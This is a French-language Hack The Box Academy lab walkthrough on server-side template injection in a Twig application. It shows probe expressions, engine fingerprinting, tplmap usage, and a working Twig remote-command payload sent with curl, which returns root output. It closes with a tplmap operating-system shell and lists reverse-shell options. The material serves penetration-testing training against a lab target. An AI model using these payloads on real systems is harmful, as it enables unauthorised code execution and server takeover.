Exemple d'exploitation SSTI 1
=============================

* * * * *

Supposons que nous testions une application accessible sur Internet (la cible peut être générée à la fin de cette section). Notre objectif sera d'identifier si l'application est vulnérable à l'injection de modèle côté serveur.

Accédez à la fin de cette section et cliquez sur `Click here to spawn the target system!`, puis utilisez la Pwnbox fournie ou une VM locale pour suivre. Si vous parcourez la cible, vous tomberez sur l'application ci-dessous.

![image](https://academy.hackthebox.com/storage/modules/145/img/twig1.png)

Soumettons sur le champ de saisie des expressions mathématiques entre accolades, telles que celles mentionnées dans la `SSTI Identification`section commençant par `{7*7}`.

![image](https://academy.hackthebox.com/storage/modules/145/img/twig2.png)

Il ne semble pas que l'application ait évalué l'expression soumise. Continuons avec une autre expression, `${7*7}`cette fois.

![image](https://academy.hackthebox.com/storage/modules/145/img/twig3.png)

Il ne semble pas non plus que l'application ait évalué cette expression. Qu'en est-il `{{7*7}}`?

![image](https://academy.hackthebox.com/storage/modules/145/img/twig6.png)

Heureusement, cette fois, l'application a évalué la dernière expression mathématique que nous avons soumise et a renvoyé le résultat, 49. Il semble que nous ayons affaire à une vulnérabilité SSTI !

Comme déjà mentionné, la première chose que nous devons faire lorsque nous traitons des vulnérabilités SSTI est d'identifier le moteur de modèle utilisé par l'application. Utilisons le diagramme de PortSwigger pour nous aider (montré dans la section précédente). Nous savons déjà que l' `{{7*7}}`expression a été évaluée avec succès. L'expression suivante que le diagramme suggère d'essayer est `{{7*'7'}}`. Essayons-le et voyons comment l'application répond.

![image](https://academy.hackthebox.com/storage/modules/145/img/twig_.png)

L'application a également évalué cette expression avec succès. Selon le diagramme de PortSwigger, nous avons affaire à un moteur de template Jinja2 ou Twig.

Il existe des charges utiles spécifiques au moteur de modèle que nous pouvons utiliser pour déterminer lequel des deux est utilisé. Essayons avec celui ci-dessous spécifique à Twig :

Code : php

```
{{_self.env.display("TEST")}}

```

![image](https://academy.hackthebox.com/storage/modules/145/img/twig7.png)

La charge utile spécifique à Twig a été évaluée avec succès. Un moteur de template Twig est utilisé sur le backend. Pour obtenir une liste complète des charges utiles spécifiques au moteur de modèle, veuillez consulter les ressources suivantes :

-   [PayloadsAllTheThings - Injection de modèle](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)

-   [HackTricks - SSTI (injection de modèle côté serveur)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

Nous aurions pu automatiser le processus d'identification du moteur de modèle que nous venons d'exécuter via [tplmap](https://github.com/epinna/tplmap) , comme suit. Si vous ne l'avez pas remarqué, l'entrée de l'utilisateur est soumise via le `name`paramètre et via une requête POST (d'où le `-d`paramètre dans `tplmap`).

#### tplmap.py

  tplmap.py

```
dsgsec@htb[/htb]$ git clone https://github.com/epinna/tplmap.git
dsgsec@htb[/htb]$ cd tplmap
dsgsec@htb[/htb]$ pip install virtualenv
dsgsec@htb[/htb]$ virtualenv -p python2 venv
dsgsec@htb[/htb]$ source venv/bin/activate
dsgsec@htb[/htb]$ pip install -r requirements.txt
dsgsec@htb[/htb]$ ./tplmap.py -u 'http://<TARGET IP>:<PORT>' -d name=john

[+] Tplmap 0.5
    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Testing if POST parameter 'name' is injectable
[+] Smarty plugin is testing rendering with tag '*'
[+] Smarty plugin is testing blind injection
[+] Mako plugin is testing rendering with tag '${*}'
[+] Mako plugin is testing blind injection
[+] Python plugin is testing rendering with tag 'str(*)'
[+] Python plugin is testing blind injection
[+] Tornado plugin is testing rendering with tag '{{*}}'
[+] Tornado plugin is testing blind injection
[+] Jinja2 plugin is testing rendering with tag '{{*}}'
[+] Jinja2 plugin is testing blind injection
[+] Twig plugin is testing rendering with tag '{{*}}'
[+] Twig plugin has confirmed injection with tag '{{*}}'
[+] Tplmap identified the following injection point:

  POST parameter: name
  Engine: Twig
  Injection: {{*}}
  Context: text
  OS: Linux
  Technique: render
  Capabilities:

   Shell command execution: ok
   Bind and reverse shell: ok
   File write: ok
   File read: ok
   Code evaluation: ok, php code

[+] Rerun tplmap providing one of the following options:

    --os-shell				Run shell on the target
    --os-cmd				Execute shell commands
    --bind-shell PORT			Connect to a shell bind to a target port
    --reverse-shell HOST PORT	Send a shell back to the attacker's port
    --upload LOCAL REMOTE	Upload files to the server
    --download REMOTE LOCAL	Download remote files

```

L'étape suivante consiste à obtenir l'exécution de code à distance sur le serveur cible. Avant de déplacer la partie charge utile, il convient de mentionner que Twig a une variable `_self`, qui, en termes simples, rend publiques certaines des API internes. Cet `_self`objet a été documenté, nous n'avons donc pas besoin de forcer brutalement les noms de variables (plus à ce sujet dans les prochains exemples d'exploitation SSTI). Revenons à la partie exécution de code à distance, nous pouvons utiliser la `getFilter`fonction car elle permet l'exécution d'une fonction définie par l'utilisateur via le processus suivant :

-   Enregistrez une fonction en tant que rappel de filtre via`registerUndefinedFilterCallback`

-   Invoquer `_self.env.getFilter()`pour exécuter la fonction que nous venons d'enregistrer

#### Charge utile

Code : php

```
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}

```

Soumettons la charge utile en utilisant cURL cette fois.

#### cURL - Interagir avec la cible

  cURL - Interagir avec la cible

```
dsgsec@htb[/htb]$ curl -X POST -d 'name={{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}' http://<TARGET IP>:<PORT>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
"http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html>
<head>
  <link rel="stylesheet" type="text/css" href="css/default.css" media="screen"/>
  <title>SSTI</title>
</head>
<body>
<div class="container">
  <div class="main">
    <div class="header">
      <div class="title">
        <h1>I'm here to say hello</h1>
      </div>
    </div>
    <div class="content">

<a>
    Who are you?
    <form method='post' action=''>
        <div class="form-group">
            <input placeholder="Name" name="name" size=70></input> <button class="btn btn-default" type="submit" name='submit'>Send</button>
       </div>
    </form>
Hello uid=0(root) gid=0(root) groups=0(root)
Linux serversideattackssstitwig-60784-78bd58b5b-pmvvv 4.19.0-17-cloud-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64 GNU/Linux
serversideattackssstitwig-60784-78bd58b5b-pmvvv
serversideattackssstitwig-60784-78bd58b5b-pmvvv!</a>

        </div>
        <div class="clearer"><span></span></div>
    </div>
    <div class="footer">Break me!</div>
</div>
</body>

```

Comme nous pouvons le voir dans la sortie/réponse ci-dessus, la charge utile soumise a été évaluée et les commandes spécifiées ( `id`, `uname -a`et `hostname`) ont été exécutées avec succès.

Encore une fois, nous aurions pu automatiser le processus d'exploitation du moteur de template que nous venons d'exécuter via [tplmap](https://github.com/epinna/tplmap) , comme suit.

#### tplmap.py - Shell du système d'exploitation

  tplmap.py - Shell du système d'exploitation

```
dsgsec@htb[/htb]$ ./tplmap.py -u 'http://<TARGET IP>:<PORT>' -d name=john --os-shell

[+] Tplmap 0.5
    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Testing if POST parameter 'name' is injectable
[+] Smarty plugin is testing rendering with tag '*'
[+] Smarty plugin is testing blind injection
[+] Mako plugin is testing rendering with tag '${*}'
[+] Mako plugin is testing blind injection
[+] Python plugin is testing rendering with tag 'str(*)'
[+] Python plugin is testing blind injection
[+] Tornado plugin is testing rendering with tag '{{*}}'
[+] Tornado plugin is testing blind injection
[+] Jinja2 plugin is testing rendering with tag '{{*}}'
[+] Jinja2 plugin is testing blind injection
[+] Twig plugin is testing rendering with tag '{{*}}'
[+] Twig plugin has confirmed injection with tag '{{*}}'
[+] Tplmap identified the following injection point:

  POST parameter: name
  Engine: Twig
  Injection: {{*}}
  Context: text
  OS: Linux
  Technique: render
  Capabilities:

   Shell command execution: ok
   Bind and reverse shell: ok
   File write: ok
   File read: ok
   Code evaluation: ok, php code

[+] Run commands on the operating system.

Linux $

```

Nous pouvons maintenant exécuter n'importe quelle commande de notre choix via le shell `tplmap`établi pour nous !

Maintenant, passez à l'exercice de cette section et complétez l'objectif soit en fabriquant vous-même la charge utile, soit à l'aide d'un obus obtenu à l'aide de `tplmap`.

Remarque : Lorsque nous remarquons que les expressions mathématiques que nous soumettons sont évaluées, l'application peut également être vulnérable à XSS.

Testons la déclaration ci-dessus en soumettant une charge utile XSS entre accolades à la cible d'exercice de cette section. Le résultat de cette opération peut être vu dans l'image ci-dessous.

![image](https://academy.hackthebox.com/storage/modules/145/img/twig8.png)

